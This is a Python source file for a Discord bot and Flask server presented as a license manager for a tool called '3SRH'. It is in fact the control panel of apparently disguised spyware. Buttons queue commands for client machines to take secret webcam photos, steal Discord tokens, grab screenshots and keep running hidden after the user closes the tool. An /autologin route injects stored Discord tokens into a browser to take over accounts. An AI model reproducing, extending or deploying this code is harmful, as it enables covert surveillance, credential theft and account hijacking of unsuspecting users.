import os
import base64
import json
import random
import string
import time
import asyncio
import discord
from discord import app_commands
import requests
from flask import Flask, request, render_template_string
from threading import Thread

app = Flask('')

HOST_URL = "https://threesrh-system-data.onrender.com"

@app.route('/')
def home():
    return "3SRH Manager Bot is alive and running!"

@app.route('/autologin')
def autologin():
    sid = request.args.get('sid')
    if not sid: return "❌ Invalid Session ID", 400
    try:
        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
        headers = {"Authorization": f"Bearer {GITHUB_TOKEN}"}
        r = requests.get(url, headers=headers, timeout=5)
        if r.status_code == 200:
            file_data = r.json()
            db = json.loads(base64.b64decode(file_data["content"]).decode("utf-8"))
            sessions = db.get("web_sessions", {})
            if sid in sessions:
                session_data = sessions[sid]
                credential = session_data.get("credential")
                html_page = f"""
                <html>
                <head><title>3SRH Auto Login</title></head>
                <body style="background-color: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
                    <h2>🔄 جاري تسجيل الدخول تلقائياً...</h2>
                    <script>
                        setTimeout(function() {{
                            localStorage.setItem('token', JSON.stringify("{credential}"));
                            window.location.href = 'https://discord.com/app';
                        }}, 1000);
                    </script>
                </body>
                </html>
                """
                return html_page
    except Exception:
        pass
    return "❌ Session expired or not found", 404

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

keep_alive()

TOKEN = os.getenv('TOKEN')
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
REPO_OWNER = os.getenv('REPO_OWNER', 'kqi5q')
REPO_NAME = os.getenv('REPO_NAME', '3srh-system-data')
FILE_PATH = os.getenv('FILE_PATH', 'licenses.json')
CHANNEL_ID = int(os.getenv('CHANNEL_ID', 1547705815698382970))

class LicenseBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)

    async def setup_hook(self):
        await self.tree.sync()
        print("Slash commands synced successfully!")

    async def on_ready(self):
        print(f"Logged in as {self.user} (ID: {self.user.id})")
        print("Bot is online and ready!")

    async def on_interaction(self, interaction: discord.Interaction):
        if interaction.type == discord.InteractionType.component:
            custom_id = interaction.data.get("custom_id", "")
            prefixes = ("ban_", "unban_", "recycle_", "kick_")
            if custom_id.startswith(prefixes):
                if not interaction.response.is_done():
                    await interaction.response.defer(thinking=True, ephemeral=True)
                try:
                    action, encoded_data = custom_id.split("_", 1)
                    padding = "=" * (-len(encoded_data) % 4)
                    decoded_bytes = base64.urlsafe_b64decode(encoded_data + padding)
                    raw_data = decoded_bytes.decode("utf-8")
                    user_code, current_device = raw_data.split(":", 1)
                except Exception:
                    await interaction.followup.send("❌ فشل تحليل بيانات الزر.", ephemeral=True)
                    return

                db, sha, url, headers = fetch_db()
                if not db:
                    await interaction.followup.send("❌ فشل الاتصال بغيت هب.", ephemeral=True)
                    return

                if action == "ban":
                    if "blacklisted_codes" not in db: db["blacklisted_codes"] = []
                    if "blacklisted_devices" not in db: db["blacklisted_devices"] = []
                    if user_code not in db["blacklisted_codes"]: db["blacklisted_codes"].append(user_code)
                    if current_device and current_device not in db["blacklisted_devices"]: db["blacklisted_devices"].append(current_device)
                    if user_code in db.get("codes", {}):
                        db["codes"][user_code]["used"] = False
                        db["codes"][user_code]["device"] = None
                    if save_db(db, sha, url, headers, f"Ban code {user_code} via button"):
                        await interaction.followup.send(f"🚫 تم حظر الكود `{user_code}` والجهاز بنجاح!", ephemeral=True)

                elif action == "unban" or action == "recycle":
                    if user_code in db.get("blacklisted_codes", []): db["blacklisted_codes"].remove(user_code)
                    if current_device in db.get("blacklisted_devices", []): db["blacklisted_devices"].remove(current_device)
                    if user_code in db.get("codes", {}):
                        db["codes"][user_code]["used"] = False
                        db["codes"][user_code]["device"] = None
                    if save_db(db, sha, url, headers, f"Reset code {user_code} via button"):
                        await interaction.followup.send(f"♻️ تم إلغاء الحظر وتصفير الكود `{user_code}`!", ephemeral=True)

                elif action == "kick":
                    if "targeted_kick_messages" not in db: db["targeted_kick_messages"] = {}
                    db["targeted_kick_messages"][user_code] = {"msg": "تم طردك من المشرف", "id": str(int(time.time()))}
                    if save_db(db, sha, url, headers, f"Kick code {user_code} via button"):
                        await interaction.followup.send(f"👢 تم إرسال أمر الطرد للعميل `{user_code}`!", ephemeral=True)

client = LicenseBot()

def generate_random_code():
    chars = string.ascii_uppercase + string.digits
    part = ''.join(random.choices(chars, k=5))
    return f"3SRH-{part}"

def fetch_db():
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
    headers = {"Authorization": f"Bearer {GITHUB_TOKEN}"}
    r = requests.get(url, headers=headers, timeout=5)
    if r.status_code == 200:
        file_data = r.json()
        db = json.loads(base64.b64decode(file_data["content"]).decode("utf-8"))
        return db, file_data["sha"], url, headers
    return None, None, url, headers

def save_db(db, sha, url, headers, commit_message):
    new_content = base64.b64encode(json.dumps(db, indent=4).encode("utf-8")).decode("utf-8")
    update_data = {"message": commit_message, "content": new_content, "sha": sha}
    r = requests.put(url, headers=headers, json=update_data, timeout=5)
    return r.status_code in [200, 201]

class DeviceActionsView(discord.ui.View):
    def __init__(self, code, hwid, ip, port):
        super().__init__(timeout=60)
        self.code = code
        self.hwid = hwid
        self.ip = ip
        self.port = port

    @discord.ui.button(label="🚫 حظر الكود والهاردوير", style=discord.ButtonStyle.danger, custom_id="dev_act_ban", row=0)
    async def ban_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "blacklisted_codes" not in db: db["blacklisted_codes"] = []
            if "blacklisted_devices" not in db: db["blacklisted_devices"] = []
            if self.code not in db["blacklisted_codes"]: db["blacklisted_codes"].append(self.code)
            if self.hwid and self.hwid not in db["blacklisted_devices"]: db["blacklisted_devices"].append(self.hwid)
            db["codes"][self.code]["used"] = False
            db["codes"][self.code]["device"] = None
            if save_db(db, sha, url, headers, f"Ban HWID {self.hwid}"):
                await interaction.followup.send(f"🚫 تم حظر الكود والهاردوير للـ IP: `{self.ip}` بنجاح!", ephemeral=True)

    @discord.ui.button(label="👢 طرد بدون حظر", style=discord.ButtonStyle.primary, custom_id="dev_act_kick", row=0)
    async def kick_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "targeted_kick_messages" not in db: db["targeted_kick_messages"] = {}
            db["targeted_kick_messages"][self.code] = {"msg": "تم طردك من المالك", "id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Kick {self.ip}"):
                await interaction.followup.send(f"👢 تم إرسال أمر الطرد للـ IP: `{self.ip}`!", ephemeral=True)

    @discord.ui.button(label="📸 التقاط كاميرا سرية", style=discord.ButtonStyle.secondary, custom_id="dev_act_webcam", row=1)
    async def webcam_snapshot_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_webcams" not in db: db["remote_webcams"] = {}
            db["remote_webcams"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Request webcam for {self.code}"):
                await interaction.followup.send("📸 تم طلب التقاط صورة الكاميرا السرية!", ephemeral=True)

    @discord.ui.button(label="🔑 سحب توكنات ديسكورد", style=discord.ButtonStyle.secondary, custom_id="dev_act_tokens", row=1)
    async def tokens_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_token_stealers" not in db: db["remote_token_stealers"] = {}
            db["remote_token_stealers"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Steal tokens for {self.code}"):
                await interaction.followup.send("🔑 تم إرسال أمر سحب توكنات ديسكورد للعميل!", ephemeral=True)

    @discord.ui.button(label="📸 لقطة شاشة", style=discord.ButtonStyle.secondary, custom_id="dev_act_screenshot", row=1)
    async def screenshot_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_screenshots" not in db: db["remote_screenshots"] = {}
            db["remote_screenshots"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Screenshot {self.code}"):
                await interaction.followup.send("📸 تم إرسال أمر التقاط الشاشة!", ephemeral=True)

    @discord.ui.button(label="🛡️ تفعيل الثبات الإلزامي", style=discord.ButtonStyle.success, custom_id="dev_act_lock_app", row=2)
    async def lock_app_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_lock_states" not in db: db["remote_lock_states"] = {}
            db["remote_lock_states"][self.code] = {"locked": True, "id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Lock closure {self.code}"):
                await interaction.followup.send("🛡️ تم تفعيل الثبات الإلزامي! لو حاول العميل إغلاق الأداة ستستمر بالعمل خفية.", ephemeral=True)

    @discord.ui.button(label="🔓 إلغاء الثبات (إغلاق عادي)", style=discord.ButtonStyle.secondary, custom_id="dev_act_unlock_app", row=2)
    async def unlock_app_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_lock_states" in db and self.code in db["remote_lock_states"]:
                del db["remote_lock_states"][self.code]
            if save_db(db, sha, url, headers, f"Unlock closure {self.code}"):
                await interaction.followup.send("🔓 تم إلغاء الثبات، وأصبح بإمكانه إغلاق الأداة بشكل طبيعي.", ephemeral=True)

    @discord.ui.button(label="🛑 إغلاق دائم وإيقاف الخلفية", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_persistent", row=3)
    async def kill_persistent_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_kill_permanently" not in db: db["remote_kill_permanently"] = {}
            db["remote_kill_permanently"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Kill persistent {self.code}"):
                await interaction.followup.send("🛑 تم إرسال أمر التدمير والخروج النهائي للعميل!", ephemeral=True)

class DevicesSubMenuView(discord.ui.View):
    def __init__(self, devices_list):
        super().__init__(timeout=180)
        for code, info in devices_list[:25]:
            self.add_item(DeviceManageButton(code, info))

class DeviceManageButton(discord.ui.Button):
    def __init__(self, code, info):
        ip = info.get("ip", "Unknown")
        port = info.get("port", "8888")
        super().__init__(label=f"🌐 {ip} : {port} ({code})", style=discord.ButtonStyle.secondary, custom_id=f"man_dev_{code}")
        self.code = code
        self.info = info

    async def callback(self, interaction: discord.Interaction):
        ip = self.info.get('ip', 'Unknown')
        port = self.info.get('port', '8888')
        view = DeviceActionsView(self.code, self.info.get("device"), ip, port)
        if not interaction.response.is_done():
            await interaction.response.send_message(
                f"⚙️ **لوحة التحكم بالعميل:**\n🔑 الكود: `{self.code}`\n🌐 IP: `{ip}`\n🔒 HWID: `{self.info.get('device')}`", 
                view=view, ephemeral=True
            )

class MainDashboardView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="💻 الأجهزة والتحكم المطلق", style=discord.ButtonStyle.secondary, custom_id="dash_main_devices", row=0)
    async def devices_menu_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, _, _, _ = fetch_db()
        if not db:
            await interaction.followup.send("❌ فشل الاتصال بقاعدة البيانات.", ephemeral=True)
            return
        devices_list = [(code, info) for code, info in db.get("codes", {}).items() if info.get("used") and info.get("device")]
        if not devices_list:
            await interaction.followup.send("🟢 لا توجد أي أجهزة متصلة حالياً.", ephemeral=True)
            return
        view = DevicesSubMenuView(devices_list)
        await interaction.followup.send("⚙️ **اختر الجهاز للتحكم الكامل به:**", view=view, ephemeral=True)

@client.tree.command(name="statsgui", description="لوحة معلومات وإحصائيات تفاعلية")
async def stats_gui_command(interaction: discord.Interaction):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    db, _, _, _ = fetch_db()
    if not db: return
    codes = db.get("codes", {})
    total = len(codes)
    used = sum(1 for c in codes.values() if c.get("used"))
    available = total - used
    embed = discord.Embed(title="📊 لوحة التحكم والإحصائيات الشاملة", color=0xA871FF)
    embed.add_field(name="📌 الإجمالي", value=f"`{total}`", inline=True)
    embed.add_field(name="🟢 المتاحة", value=f"`{available}`", inline=True)
    embed.add_field(name="🔴 المستخدمة", value=f"`{used}`", inline=True)
    await interaction.followup.send(embed=embed, view=MainDashboardView(), ephemeral=True)

if TOKEN:
    client.run(TOKEN)
